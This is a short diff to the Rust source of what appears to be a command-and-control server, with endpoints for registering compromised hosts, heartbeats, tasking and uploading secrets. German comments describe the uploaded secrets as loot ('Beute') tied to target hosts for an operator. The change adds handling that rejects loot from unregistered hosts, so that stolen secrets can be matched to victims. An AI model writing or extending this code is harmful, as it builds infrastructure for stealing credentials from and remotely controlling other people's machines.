@@ -24,7 +24,7 @@ use axum::{
 };
 use axum_server::tls_rustls::RustlsConfig;
 use clap::Parser;
-use db::Db;
+use db::{Db, DbError};
 use kx_core::c2::{
     CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
     TaskResultRequest, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS,
@@ -133,6 +133,14 @@ async fn upload_secret(
     // die sie betrifft.
     match st.db.upsert_secret(&req) {
         Ok(()) => StatusCode::CREATED.into_response(),
+        // Der Host ist dem Server unbekannt: die Beute waere eine Waisenzeile,
+        // der Operator koennte sie keinem Zielhost zuordnen. Der Agent muss
+        // den Host zuerst registrieren.
+        Err(DbError::UnbekannterHost(id)) => (
+            StatusCode::BAD_REQUEST,
+            format!("unbekannter Host {id} — der Host muss vor der Beute registriert sein"),
+        )
+            .into_response(),
         Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
     }
 }
